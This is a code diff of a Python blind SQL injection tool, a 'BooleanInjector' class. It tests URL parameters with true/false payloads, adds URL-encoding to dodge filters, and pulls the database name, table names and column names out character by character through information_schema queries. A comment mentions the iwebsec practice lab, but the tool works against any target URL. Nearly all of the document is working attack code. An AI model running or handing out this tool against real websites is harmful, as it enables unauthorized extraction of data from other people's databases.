@@ -1,10 +1,12 @@
 from typing import Literal
 
 import requests
+from prettytable import PrettyTable
 from requests import Response
 from termcolor import colored
 import datetime
 import random
+
 
 info = f"[{colored("info", "green")}]"
 error = f"[{colored("error", "red")}]"
@@ -14,14 +16,18 @@ fatal = f"[{colored("fatal_error", "white", "on_light_red")}]"
 def get_time():
     return f"[{colored(f"{datetime.datetime.now().strftime('%H:%M:%S.%f')}", "light_cyan")}]"
 
-def restrict_values(values):
+
+def restrict_values(values: list):
     def decorator(func):
         def wrapper(*args, **kwargs):
             if args and args[0] not in values:
                 raise ValueError
             return func(*args, **kwargs)
+
         return wrapper
+
     return decorator
+
 
 def parse_url(url: str):
     if "?" in url:
@@ -56,66 +62,76 @@ class BooleanInjector:
 
         self.injectable_params: list = []
         self.injection_types: list = []
-
+        self.injectable_params_count: int = len(self.injectable_params)
         self.db_length = 0
         self.db_name = ""
 
         self.tables = []
-        self.columns, self.rows= {}, {}
+        self.columns, self.rows = {}, {}
+
+        self.ptable = PrettyTable()
+        self.ptable.field_names = []
 
         self.test_injection_points()
 
         print(get_time(), "\n", f"[{colored("initialization", "light_blue")}]", sep="")
-        print("raw_url:", self.raw_url)
+        print("url:", self.raw_url)
+        print("Cookies:", self.cookie if self.use_cookie else "No Cookies")
         print("params_count:", self.params_count)
         print("params:", self.params)
+        print("values:", self.values)
+        print("injectable_params:", self.injectable_params)
         print("injectable_params_index:", self.injectable_params)
         print("injection_type:", self.injection_types)
+        if len(self.injectable_params) == 0:
+            print(fatal, "All tested parameters do not appear to be injectable.")
+            exit()
 
     def test_injection_points(self) -> None:
         # injection type: number
         for i in range(0, self.params_count):
             random_int = random.randint(1, 10000)
-            payload_true = f"and {random_int}={random_int} #"
-            payload_false = f"and {random_int}={random_int + 1} #"
-            response_true = requests.get(url=self.construct_payload(payload_true, i, "number"))
-            response_false = requests.get(url=self.construct_payload(payload_false, i, "number"))
-            if response_true.text == self.normal_response.text and response_true.text != response_false.text:
+            payload_true = f"and {random_int}={random_int}#"
+            payload_false = f"and {random_int}={random_int + 1}#"
+            response_true = self.get_payload_result(payload_true, i, "number")
+            response_false = self.get_payload_result(payload_false, i, "number")
+            if response_true and not response_false:
+                # if self.get_payload_result(payload_true, i, "number"):
                 print(get_time(), info, f"Got injectable param:{self.params[i]} (type:number)")
                 if self.show_payload:
-                    print("by using payload:\n", colored(self.construct_payload(payload_false, i, "number"), "cyan"))
-                self.injectable_params.append(i)
+                    print("by using payload:\n", colored(self.construct_payload(payload_false, i, inject_type="number"), "cyan"))
+                self.injectable_params. append(i)
                 self.injection_types.append("number")
             else:
-                payload_true = f"and '{random_int}'='{random_int}' #"
-                payload_false = f"and '{random_int}'='{random_int + 1}' #"
-                response_true = requests.get(url=self.construct_payload(payload_true, i, "char"))
-                response_false = requests.get(url=self.construct_payload(payload_false, i, "char"))
-                if response_true.text == self.normal_response.text and response_true.text != response_false.text:
+                # injection type: char
+                payload_true = f"and '{random_int}'='{random_int}'#"
+                payload_false = f"and '{random_int}'='{random_int + 1}'#"
+                response_true = self.get_payload_result(payload_true, i, "char")
+                response_false = self.get_payload_result(payload_false, i, "char")
+                if response_true and not response_false:
                     print(get_time(), info, f"Got injectable param:{self.params[i]} (type:char)",
-                          colored(self.construct_payload(payload_false, i, "char"), "cyan"))
+                          colored(self.construct_payload(payload_false, i, inject_type="char"), "cyan"))
                     if self.show_payload:
                         print("by using payload:\n",
-                              colored(self.construct_payload(payload_false, i, "number"), "cyan"))
+                              colored(self.construct_payload(payload_false, i, inject_type="number"), "cyan"))
                     self.injectable_params.append(i)
                     self.injection_types.append("char")
-
-        if len(self.injectable_params) == 0:
-            print(fatal, "All tested parameters do not appear to be injectable.")
-            exit()
 
     def construct_payload(self,
                           sqli: str,
                           point: int,
+                          r: int | None = 0,
                           inject_type: Literal["number", "char"] | None = None
                           ) -> str:
         """
         根据注入点和sql语句组装payload
+        :param r: 混淆选项
         :param sqli: 注入的sql语句
         :param point: 选择注入点
         :param inject_type: 注入类型, 如果注入类型未指定，则根据self.injection_type获取注入类型
         :return: 构建好的带有目标url的完整payload
         """
+        # get injection type
         if inject_type is None:
             inject_param = self.injectable_params[point]
             if inject_param in self.injectable_params:
@@ -125,40 +141,54 @@ class BooleanInjector:
                 exit()
         else:
             t = inject_type
-        # if self.params_count < 2:
-        #     if t == "number":
-        #         payload = f"{self.target_url}?{str(self.params[0])}={str(self.values[0])} {sqli}"
-        #     else:
-        #         payload = f"{self.target_url}?{str(self.params[0])}={str(self.values[0])}' {sqli}"
-        # else:
+
         payload = f"{self.target_url}?"
         for i in range(0, self.params_count):
-            payload += f"{self.params[i]}={self.values[i] + ("'" if t == "char" else "") + (f" {sqli}" if i == point else "") + ("&" if i != self.params_count - 1 else "")}"
+            payload += f"{self.params[i]}={self.values[i] + ("'" if t == "char" and i == point else "") + (f" {sqli}" if i == point else "") + ("&" if i != self.params_count - 1 else "")}"
+
+        if r == 0:
+            # print("r=0")
+            pass
+        elif r == 1:
+            # print("r=1")
+            payload = payload.replace(" and ", "+and+").replace("#", "%23").replace("=", "%3D").replace(" ", "%20").replace("'", "%27")
+            for param in self.params:
+                payload = payload.replace(f"{param}%3D", f"{param}=")
+        elif r == 2:
+            pass
+        # reserve
+        # print(payload)
         return payload
 
-    def get_payload_result(self, sqli, point) -> bool:
+    def get_payload_result(self,
+                           sqli: str,
+                           point: int,
+                           inject_type: Literal["number", "char"] | None = None) -> bool:
         """
+        :param inject_type: 注入类型
         :param sqli: 具有bool值的sql语句
         :param point: 选择注入点
         :return: 返回布尔值即payload内容是否为真
         """
-        payload = self.construct_payload(sqli, point)
-        sqli_response = requests.get(url=payload, cookies=self.cookie)
-        # print(get_time(), "[info]", "payload constructed:", payload)
-        # 确认条件
-        return True if self.normal_response.text == sqli_response.text else False
-
+        for r in range(0, 2):
+            payload = self.construct_payload(sqli, point, r, inject_type)
+            sqli_response = requests.get(url=payload, cookies=self.cookie)
+            # print(get_time(), "[info]", "payload constructed:", payload)
+            # 确认条件
+            if self.normal_response.text == sqli_response.text:
+                return True
+        return False
         # for iwebsec
         # return True if "welcome to iwebsec!!!" in sqli_response.text else False
 
     def get_db_length(self) -> int:
-        for point in range(0, self.params_count):
+        for point in range(0, self.injectable_params_count):
             for length in range(1, 32):
                 payload = f"and length(database()) = {length} #"
                 if self.get_payload_result(payload, point):
                     print(get_time(), info, colored(f"Got database name length:", "light_green"),
                           colored(f"{length}", "light_yellow"),
-                          end=f"by using payload:\n{colored(self.construct_payload(payload, point), "cyan")}"
+                          end=f"by using payload:\n{colored(self.construct_payload(payload, point), "cyan")}\n"
                           if self.show_payload else "\n")
                     self.db_length = length
                     return length
@@ -167,7 +197,7 @@ class BooleanInjector:
     def get_db_name(self):
         extracted_name = ""
         payload_list = []
-        for point in range(0, self.params_count):
+        for point in range(0, self.injectable_params_count):
             print(get_time(), info, "fetching database name...", end="")
             for i in range(1, self.db_length + 1):
                 # ?? 或许可以尝试使用二分查找提高效率 ??
@@ -182,10 +212,10 @@ class BooleanInjector:
                 self.db_name = extracted_name
                 print(get_time(), info, colored("Got database name:", "light_green"),
                       colored(extracted_name, "light_yellow"),
-                      end="by using payload\n" if self.show_payload else "\n")
+                      end=" by using payloads:\n" if self.show_payload else "\n")
                 if self.show_payload:
-                    for payload in payload_list:
-                        print(colored(payload, "cyan"))
+                    for p in payload_list:
+                        print(colored(p, "cyan"))
                 break
             else:
                 print(get_time(), fatal, colored("unable to get database name length.", "red"))
@@ -193,15 +223,15 @@ class BooleanInjector:
     def get_tables(self):
         table_count = 0
         table_length = []
-        for point in range(0, self.params_count):
+        for point in range(0, self.injectable_params_count):
             # get tables count
             print(get_time(), info, "fetching tables count...")
             for length in range(1, 32):
                 payload = f"and (select count(table_name) from information_schema.tables where table_schema=database())={length} #"
                 if self.get_payload_result(payload, point):
                     print(get_time(), info, colored(f"Got table count:", "light_green"),
-                          colored(f"{length}", "light_yellow"),
-                          end=f"by using payload:\n{colored(self.construct_payload(payload, point), "cyan")}"
+                          colored(f"{length} ", "light_yellow"),
+                          end=f" by using payload:\n{colored(self.construct_payload(payload, point), "cyan")}\n"
                           if self.show_payload else "\n")
                     table_count = length
                     break
@@ -213,7 +243,7 @@ class BooleanInjector:
                     if self.get_payload_result(payload, point):
                         print(get_time(), info, colored(f"Got No.{table + 1} table length:", "light_green"),
                               colored(f"{length}", "light_yellow"),
-                              end=f"by using payload:\n{colored(self.construct_payload(payload, point), "cyan")}"
+                              end=f" by using payload:\n{colored(self.construct_payload(payload, point), "cyan")}\n"
                               if self.show_payload else "\n")
                         table_length.append(length)
                         payload_list = []
@@ -227,42 +257,68 @@ class BooleanInjector:
                                     print(chr(char), end="", flush=True)
                                     payload_list.append(self.construct_payload(payload, point))
                                     extracted_name += chr(char)
-                        print("\n", end="")
+                                    break
+                        # fetching finished
+                        print("\n", sep="", end="")
                         print(get_time(), info, colored(f"Got No.{table + 1} name:", "light_green"),
                               colored(extracted_name, "light_yellow"),
-                              end="by using payload\n" if self.show_payload else "\n")
+                              end=" by using payloads:\n" if self.show_payload else "\n")
                         self.tables.append(extracted_name)
+                        # self.ptable.field_names.append(extracted_name)
                         if self.show_payload:
-                            for payload in payload_list:
-                                print(colored(payload, "cyan"))
+                            for p in payload_list:
+                                print(colored(p, "cyan"))
                         break
         if len(table_length) == 0:
             print(fatal)
 
     # @restrict_values(self.tables)
     def get_columns(self, witch_table: str = "all"):
-        columns_length, columns_count = {}, {}
-        for point in range(0, self.params_count):
+        for point in range(0, self.injectable_params_count):
             # get column count
             for table in self.tables:
+                columns_count = 0  # store the count of column in this table
                 for c in range(1, 32):
                     payload = f"and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name='{table}')={c},1,0) #"
                     if self.get_payload_result(payload, point):
-                        columns_count[table] = c
-                        print(get_time(), info, colored(f"Got table[{table}] columns count: {c}"),
-                              end=f"by using payload:\n{colored(payload, "cyan")}" if self.show_payload else "\n")
+                        columns_count = c
+                        print(get_time(), info, colored(f"Got table[{table}] columns count:", "light_green"),
+                              colored(f"{c}", "light_yellow"),
+                              end=f" by using payload:\n{colored(payload, "cyan")}\n" if self.show_payload else "\n")
                         break
-                # got all column counts in every table, then get column name length
-                for column in range(0, columns_count[table]):
-                    columns_length[table] = []
+                # got column counts in this table (not all), then fetch column name length
+                for column_index in range(0, columns_count):
+                    columns_length = 0
                     for length in range(1, 32):
-                        payload = f"and if((select length(table_name) from information_schema.tables where table_schema=database() limit {column},1)={length},1,0) %23"
+                        payload = f"and if((select length(column_name) from information_schema.columns where table_schema=database() and table_name='{table}' limit {column_index},1)={length},1,0) #"
                         if self.get_payload_result(payload, point):
-                            columns_length[table].append(length)
-                            print(get_time(), info, colored(f"Got table[{table}] No.{column} column length: {length}"),
-                                  end=f"by using payload:\n{colored(payload, "cyan")}" if self.show_payload else "\n")
+                            columns_length = length
+                            print(get_time(), info,
+                                  colored(f"Got table[{table}] No.{column_index + 1} column length:", "light_green"),
+                                  colored(f"{columns_length}", "light_yellow"),
+                                  end=f" by using payload:\n{colored(payload, "cyan")}\n" if self.show_payload else "\n")
                             break
+                    # got this column name by length
+                    extracted_name = ""
+                    payload_list = []
+                    print(get_time(), info, f"fetching table[{table}] No.{column_index + 1} column name...", end="")
+                    for i in range(1, columns_length + 1):
+                        for char in range(32, 127):
+                            payload = f"and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='{table}' limit {column_index},1),{i},1))={char},1,0) #"
+                            if self.get_payload_result(payload, point):
+                                extracted_name += chr(char)
+                                payload_list.append(self.construct_payload(payload, point))
+                                print(chr(char), end="", flush=True)
+                                break
+                    print("\n", sep="", end="")
+                    print(get_time(), info,
+                          colored(f"Got table[{table}] No.{column_index + 1} column name:", "light_green"),
+                          colored(extracted_name, "light_yellow"),
+                          end=" by using payloads:\n" if self.show_payload else "\n")
+                    # self.ptable.
+                    if self.show_payload:
+                        for p in payload_list:
+                            print(colored(p, "cyan"))
 
-
-
-
+    def display(self):
+        print(self.ptable)
